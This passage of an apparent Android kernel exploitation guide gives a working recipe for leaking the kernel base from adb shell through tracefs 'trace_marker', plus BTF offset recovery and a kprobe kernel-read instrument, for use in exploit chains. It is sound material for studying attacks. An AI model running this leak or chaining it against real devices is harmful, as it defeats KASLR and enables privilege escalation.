[v6.1 `kernel/trace/trace.c`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/trace/trace.c?h=v6.1).
It reserves a `TRACE_PRINT` record and stores its *own* code address into it:

```c
entry = ring_buffer_event_data(event);
entry->ip = _THIS_IP_;
len = __copy_from_user_inatomic(&entry->buf, ubuf, cnt);
```

`struct print_entry` is `{ struct trace_entry ent; unsigned long ip; char buf[]; }`, and `struct trace_entry` is
`{ unsigned short type; unsigned char flags; unsigned char preempt_count; int pid; }` — 8 bytes. So in the raw
page the leaked pointer is the eight little-endian bytes *immediately preceding* the marker string, which is
what makes the scan trivial: find your marker, step back 8. The pointer never passes through vsprintf, so
`kptr_restrict` is not in the path, and no ftrace event has to be enabled.

The recipe below runs at uid 2000 from `adb shell`, and the reason it can is that tracefs access on Android is
decided per file rather than per mount. Android mounts tracefs with group `AID_READTRACEFS` (3012) and hands
the files its own tracing tools need to that group, so `tracing_on` and `per_cpu/cpu0/trace_pipe_raw` open from
`shell`, which is a member. `trace_marker` is more open still: it is the handle `libcutils`' atrace writes from
every process, so it carries an SELinux type of its own — AOSP labels it `debugfs_trace_marker` — and policy
grants write on that type to every domain without opening the rest of the directory. `kprobe_events` sits in
the same directory on the other side of that line: arming a probe needs root *and* a domain the policy permits
to write it, and an `adb shell` at uid 2000 has neither. That is the distinction behind the root-only
statements about tracefs in [03-crash-triage-and-root-cause-analysis.md](03-crash-triage-and-root-cause-analysis.md)
and [08-triggering-races-reliably.md](08-triggering-races-reliably.md), which are about the probe-arming files.
Settle it on your own target with one listing, reading the group column for DAC and the type column for the
`sesearch` query above:

```sh
ls -lZ /sys/kernel/tracing/tracing_on /sys/kernel/tracing/trace_marker \
       /sys/kernel/tracing/kprobe_events /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw
id -G                                          # 3012 present means the read half is available
```

The split matters when choosing which domain delivers the leak. An app domain gets the `trace_marker` write
but not the raw read, so the technique as a whole is shell-reachable and not app-reachable, and a chain that
starts in an app has to obtain the base some other way or from a shell-side stage.

```sh
T=/sys/kernel/tracing

# 1. tracing_on must be 1: with the ring buffer disabled __trace_buffer_lock_reserve()
#    returns NULL and tracing_mark_write() returns -EBADF, so the write fails loudly
echo 1 > $T/tracing_on

# 2. drain cpu0's buffer, or the fresh record is buried under unrelated traffic
dd if=$T/per_cpu/cpu0/trace_pipe_raw of=/dev/null bs=4096 iflag=nonblock 2>/dev/null

# 3. write the marker from cpu0 — raw reads are per-CPU, so writer and reader must agree
taskset -c 0 sh -c "echo LEAKPROBE > $T/trace_marker" || echo "marker write failed: $?"

# 4. read the raw page back and find the record
dd if=$T/per_cpu/cpu0/trace_pipe_raw bs=4096 count=1 2>/dev/null | xxd | grep -B1 LEAKPROBE
```

In C the pinning is `sched_setaffinity(0, sizeof(mask), &mask)` with cpu0 set, before the marker write. The two
lines that come back around the marker:

```
00000f80: 2c1a 0000 0500 0100 d512 0000 c80a ffea  ,...............
00000f90: d4ff ffff 4c45 414b 5052 4f42 4500 0000  ....LEAKPROBE...
```

Reading left to right: a 4-byte ring-buffer event header, the 8-byte `struct trace_entry` (`type` 0x0005 =
`TRACE_PRINT`, flags, preempt count, pid), the 8-byte `ip`, then the marker bytes `4c 45 41 4b ...` =
`LEAKPROBE`. The eight bytes `c8 0a ff ea d4 ff ff ff` straddle the line break and reassemble, little-endian, to
`0xffffffd4eaff0ac8`. That is `tracing_mark_write`'s `_THIS_IP_` in the running image, so the subtraction is

```
_text = 0xffffffd4eaff0ac8 - 0x001f0ac8 = 0xffffffd4eae00000
slide = 0xffffffd4eae00000 - 0xffffffc008000000 = 0x14e2e00000
```

where `0x1f0ac8` is that instruction's offset from `_text` for this build and `0xffffffc008000000` is the
link-time `_text`. The per-build offset is derived the same way as any other offset — see
[01-vulnerability-discovery-and-patch-triage.md](01-vulnerability-discovery-and-patch-triage.md).

The base this yields is `_text`, the image base, and *not* `_stext`. On arm64 `_stext` follows `.head.text`, so
the two differ by the head and vectors gap — 0x10000 on this project's GKI build. A consumer that resolves a
symbol expressed as an offset from `_stext` must add that gap, and a consumer that resolves offsets from `_text`
must not. Measure the gap for the build in front of you rather than copying the number:

```sh
readelf -s vmlinux.elf | grep -wE '_text|_stext'      # or grep the target's System.map
```

Getting this backwards produces a base wrong by exactly 0x10000, which resolves every symbol into the middle of
some other function — a CFI abort or a fault, far from the cause.

Gate the result before you believe it. A leak can return the wrong field, a stale record, or a neighbouring
value. Three cheap checks, in increasing strength:

1. The value is in the kernel half of the address space.
2. The low 21 bits of the recovered address equal the low 21 bits of its link-time address. KASLR aligns the
   image to 2MB (the `bic x0, x0, #SZ_2M - 1` above), so bits 0–20 are invariant: `0xffffffd4eaff0ac8` and the
   link-time `0xffffffc0081f0ac8` both end in `0x1f0ac8`. This is a 512-fold stronger check than comparing the
   page offset alone, and it costs the same.
3. The implied slide lies inside the loader's window and on its alignment — `[0x1000000000, 0x3000000000)` and
   2MB for the GKI kernels here, which is 65536 admissible values out of a 64-bit space.

Check 2 is worth confirming once on a rooted unit rather than trusting the algebra. Run
`grep -w _text /proc/kallsyms` across several reboots: bits 0–20 of the printed address stay constant while bits
21 and above move.

## Recovering structure layout and symbols without rebuilding the kernel

Everything above needs offsets, and on a production Android device you cannot rebuild the kernel to get them.

BTF solves the structure half. When `CONFIG_DEBUG_INFO_BTF=y`, the build links a
[BPF Type Format](https://docs.kernel.org/bpf/btf.html) blob describing every type in the kernel, and the kernel
exports it at `/sys/kernel/btf/vmlinux`. Android's build system exposes this as the `--btf_debug_info` flag,
documented in [kleaf/docs/btf.md](https://android.googlesource.com/kernel/build/+/refs/heads/master/kleaf/docs/btf.md),
defaulting to whatever the kernel config says.

```sh
# every type in the running kernel, as C
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h

# one structure, with offsets and holes annotated
pahole -F btf -C cred /sys/kernel/btf/vmlinux
pahole -F btf -C file /sys/kernel/btf/vmlinux | grep -n 'f_inode'
```

The `format c` output is documented in the [bpftool-btf man page](https://man.archlinux.org/man/bpftool-btf.8.en);
[pahole](https://man.archlinux.org/man/extra/pahole/pahole.1.en) reads DWARF, CTF and BTF and prints each field
with its byte offset and size, which is what you actually want. `-F btf` needs a pahole new enough to read raw
BTF; where that is not available,
[10-survivability-and-measurement.md](10-survivability-and-measurement.md) gives the
`bpftool btf dump ... format raw` fallback that prints each member's `bits_offset` directly. Read the output as
ground truth for layout and as no
evidence at all about anything runtime: it gives the exact offset of `f_inode` within `struct file` for this
build, and says nothing about which slab cache a `struct file` comes from or how large that cache's stride is.

Availability is the catch, and the check is about policy rather than about permissions. `kernel/bpf/sysfs_btf.c`
creates the attribute with mode `0444`, so the DAC half never refuses anyone; on Android the SELinux label
decides it per domain. Run `ls -lZ /sys/kernel/btf/vmlinux` for the label, then actually open the file from the
domain the chain will run in — a `Permission denied` on a world-readable file is an `avc` denial, which
`logcat -b kernel` will name, and the answer to it is the image-side route below rather than a `chmod`.

The fallback needs no device at all: the identical blob is *inside the kernel image*, linked between the
ordinary symbols `__start_BTF` and `__stop_BTF`.

```sh
unpack_bootimg --boot_img boot.img --out .              # from AOSP's mkbootimg tools; yields ./kernel
vmlinux-to-elf kernel vmlinux.elf                       # symbolized ELF from the raw image
readelf -s vmlinux.elf | grep -E '__(start|stop)_BTF'   # the two bounds
objcopy --dump-section .BTF=btf.bin vmlinux.elf         # if the section survived; otherwise dd the span:
# dd if=kernel of=btf.bin bs=1 skip=$((start - text_base)) count=$((stop - start))

bpftool btf dump file btf.bin format c | head           # proof: it parses, and prints types
```

The last line is the check that matters — a slice off by a byte still produces a file, and only a parse proves
the bounds were right. On panther the slice is byte-identical to the `/sys/kernel/btf/vmlinux` harvested from
the phone. This repository does it in `runner/scripts/lib/offset_rules.py` (`btf_from_image()`, which also
verifies the BTF magic at the slice start), with `runner/scripts/lib/btf_offsets.py` parsing either source.

For symbols, `/proc/kallsyms` is the direct route, and by the `kallsyms_show_value()` rule above it usually
yields a table of zeros rather than an error. Handle that case explicitly: code that does not check will compute
offsets from nothing and fail somewhere else. Three fallbacks:

- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) reconstructs a symbolized ELF from a raw or
  stripped kernel image by parsing the compressed kallsyms table that is present in almost every build, after
  which `readelf -s vmlinux.elf` and `objdump -d --start-address=... vmlinux.elf` work normally.
- The kernel's probe interface will accept a symbol name it knows and reject one it does not. Writing
  `p:x <name>` to `kprobe_events` and immediately removing it answers "does this symbol exist" without reading
  the table and without triggering anything. A symbol's absence is not proof the code is absent — it may have
  been inlined — so treat that outcome as inconclusive rather than as a verdict.
- [drgn](https://drgn.readthedocs.io/en/latest/), written at Meta as a scriptable alternative to `crash`, walks
  live kernel structures through `/proc/kcore` with Python expressions over real types. It needs root and debug
  info, so it belongs on a development unit, not in a chain — but for answering "what does this list actually
  contain right now" it beats writing a probe per question.

## Instruments

- `dmesg | grep -i kaslr` — "KASLR enabled" or "KASLR disabled due to lack of seed"; root, and the first thing to ask.
- `zcat /proc/config.gz | grep -E 'ARM64_VA_BITS|RANDOMIZE_MODULE'` — which VA size, hence `PAGE_OFFSET`, and which module-region case; shell, needs `CONFIG_IKCONFIG_PROC`.
- `grep Features /proc/cpuinfo` — an `rng` hwcap means the FEAT_RNG seed path exists on this SoC; shell.
- `su -c 'grep -E "System RAM|Kernel code|Kernel data" /proc/iomem'` — `PHYS_OFFSET`, plus `__pa_symbol(_stext)` and `__pa_symbol(_sdata)`; root (unprivileged readers see zeros).
- `su -c 'grep module_alloc /proc/vmallocinfo'` — the virtual range the module region actually occupies, with the requesting caller; root (mode 0400).
- `cat /proc/sys/kernel/kptr_restrict`, `dmesg_restrict`, `perf_event_paranoid` — the three sysctls that decide whether `%pK`, the log buffer and `/proc/kallsyms` are masked for you; shell.
- `head -1 /proc/kallsyms` or `grep -c '^0000000000000000 ' /proc/kallsyms` — whether the symbol table's addresses are masked; shell. The address is at column 0, so a pattern with a leading space never matches.
- `ls -Z <path>` then `sesearch --allow -s <domain> -t <type> -c file <policy>` — DAC and MAC reachability of a leak source; shell for the label, `sesearch` (setools) on a workstation against a dumped policy.
- `taskset -c 0 sh -c 'echo <str> > /sys/kernel/tracing/trace_marker'` then `dd if=.../per_cpu/cpu0/trace_pipe_raw` — `tracing_mark_write`'s own code address in raw ring-buffer bytes; uid 2000, because policy grants the `trace_marker` write to every domain while the raw read and the `tracing_on` write need group `AID_READTRACEFS` (3012), which `shell` holds and app domains do not. `tracing_on` must be 1.
- `echo 'p:peek <fn> w=@<addr>:x64' > kprobe_events`, then `enable`, `tracing_on`, trigger, `trace`, `kprobe_profile` — read 8 bytes at a literal kernel address, with a hit count that separates "zero" from "never fired"; root, tracefs, `CONFIG_KPROBE_EVENTS`, `kptr_restrict` relaxed.
- `pread` on `/proc/<pid>/pagemap` — the PFN backing a virtual address; `CAP_SYS_ADMIN`, else the PFN field is zeroed.
- `/proc/zoneinfo` (`spanned`/`present`/`managed`) and `/proc/buddyinfo` — the physical band to aim an unprivileged guess at, and the allocator's free blocks per order; both shell-readable.
- `bpftool btf dump file /sys/kernel/btf/vmlinux format c` — every kernel type as C; needs `CONFIG_DEBUG_INFO_BTF`. The blob is mode 0444 (`kernel/bpf/sysfs_btf.c`), so a refused read is an SELinux denial for your domain, not a permission bit; the fallback is slicing `__start_BTF..__stop_BTF` out of a public boot image.
- `pahole -F btf -C <struct> <btf-blob>` — one structure's field offsets, sizes and holes; workstation, no device. `-C page` gives `sizeof(struct page)` for the vmemmap stride, `-C kmem_cache` gives `random` and `offset` for the freelist formula.
- `su -c 'cat /proc/slabinfo'` and `su -c 'cat /sys/kernel/slab/<cache>/object_size'` — cache inventory and per-cache geometry, the step from an object address to a page address; root, both mode 0400. What `aliases` counts, and why it reads 0 here, is [05](05-heap-grooming-and-spraying.md).
- `vmlinux-to-elf Image vmlinux.elf` then `readelf -s` / `objdump -d` — link-time symbol addresses from a stripped image; workstation, no device.
- `drgn` over `/proc/kcore` — scripted traversal of live kernel structures; root plus debug info, development units only.
- `CONFIG_KFENCE` / `CONFIG_KASAN` reports in `dmesg` — object, cache, and allocation/free stacks for a leak or UAF; debug kernel.

## Grounded in this project

The tracefs text-base leak is implemented in [`cves/lib/kaslr/`](../lib/kaslr/): `kaslr_tracefs.h` holds the
mechanism, the cpu0 pinning, the buffer drain, the `tracing_on` save-and-restore and the sanity gates, and
records the `_stext = _text + 0x10000` head gap for this build; `slide_tracefs.c` is the version linked into
exploit stages; `kaslr_marker.c` is the standalone shell binary for checking the answer against
`/proc/kallsyms` on a rooted unit; and `cves/lib/kaslr/README.md` documents how the per-build instruction
offset is derived. The window and alignment used by gate 3 above are `KASLR_SLIDE_MIN`, `KASLR_SLIDE_END` and
`KASLR_ALIGN` in [`cves/targets/kmi/`](../targets/kmi/). The physical-address
arithmetic above — including the `PHYS_OFFSET` bias on the vmemmap index — is
[`cves/lib/addr/physmap.h`](../lib/addr/physmap.h); the pagemap reader and its `CAP_SYS_ADMIN` caveat are
[`cves/lib/addr/pagemap.h`](../lib/addr/pagemap.h); the unprivileged fallback that guesses a physical band from
`/proc/zoneinfo` instead is [`cves/lib/addr/zoneguess.h`](../lib/addr/zoneguess.h); and the read-primitive-backed
version that recovers `memstart_addr` and the image displacement from the kernel itself rather than assuming them
is [`cves/lib/addr/physlayout.h`](../lib/addr/physlayout.h). The three-way distinction between "symbol present",
"symbol absent" and "table unreadable" is [`cves/lib/base/kallsyms.h`](../lib/base/kallsyms.h), and the
probe-acceptance symbol test is [`cves/lib/tools/symbol-shape.sh`](../lib/tools/symbol-shape.sh), alongside the
kprobe wrapper [`cves/lib/tools/kprobe.sh`](../lib/tools/kprobe.sh). BTF parsing and the
`__start_BTF..__stop_BTF` slice out of a boot image live in `runner/scripts/lib/btf_offsets.py` and
`runner/scripts/lib/offset_rules.py`.

## See also

- [01-vulnerability-discovery-and-patch-triage.md](01-vulnerability-discovery-and-patch-triage.md) — deriving link-time offsets and symbol sets from public kernel images.
- [02-reachability-and-attack-surface.md](02-reachability-and-attack-surface.md) — which leak sources a given SELinux domain can actually open.
- [03-crash-triage-and-root-cause-analysis.md](03-crash-triage-and-root-cause-analysis.md) — reading `WARN_ON` backtraces, KASAN/KFENCE reports and pstore/ramoops.
- [05-heap-grooming-and-spraying.md](05-heap-grooming-and-spraying.md) — slab caches, cache merging, and placing a page where its address is predictable.
- [06-cross-cache-attacks.md](06-cross-cache-attacks.md) — steering physical pages between caches, where the linear-map arithmetic is the addressing model, and the `/proc/buddyinfo` and `/proc/pagetypeinfo` views of what the page allocator is handing out.
- [07-read-write-primitives.md](07-read-write-primitives.md) — turning a leaked address into a read, and a read into more addresses.
- [10-survivability-and-measurement.md](10-survivability-and-measurement.md) — treating a leak's success rate as a measured quantity rather than an assumption.
- [12-further-reading-and-glossary.md](12-further-reading-and-glossary.md) — the full bibliography.
